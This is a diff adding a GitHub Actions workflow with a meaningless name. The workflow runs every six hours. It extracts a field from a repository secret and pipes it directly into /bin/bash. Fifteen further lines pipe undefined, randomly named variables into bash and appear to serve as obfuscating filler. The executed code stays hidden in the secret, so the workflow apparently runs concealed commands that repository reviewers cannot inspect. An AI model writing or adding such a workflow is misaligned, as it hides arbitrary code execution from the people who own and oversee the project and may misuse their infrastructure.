@@ -1,0 +1,33 @@
+name: yizhizaizhelikanzheniii
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yizhizaizhelikanzheniii
+        env:
+          q1: ${{ secrets.q1 }}
+        run: |
+          echo $q1 | jq -r .e5 | /bin/bash
+          echo $nr46 | jq -r .ofk679 | /bin/bash
+          echo $rqoln24334 | jq -r .mis46 | /bin/bash
+          echo $s5208 | jq -r .ufj4238 | /bin/bash
+          echo $ky44 | jq -r .uis49 | /bin/bash
+          echo $eu6021 | jq -r .phids306 | /bin/bash
+          echo $d22 | jq -r .e56392 | /bin/bash
+          echo $dfxdd34718 | jq -r .qcugf6 | /bin/bash
+          echo $ch20 | jq -r .tdvu85898 | /bin/bash
+          echo $dha1 | jq -r .bfu4435 | /bin/bash
+          echo $b84 | jq -r .r136 | /bin/bash
+          echo $oyf9381 | jq -r .geg33 | /bin/bash
+          echo $fo3 | jq -r .rgwn88 | /bin/bash
+          echo $eg13 | jq -r .hkjr13 | /bin/bash
+          echo $g905 | jq -r .exqq85005 | /bin/bash
+          echo $lv1716 | jq -r .gvz6 | /bin/bash
+
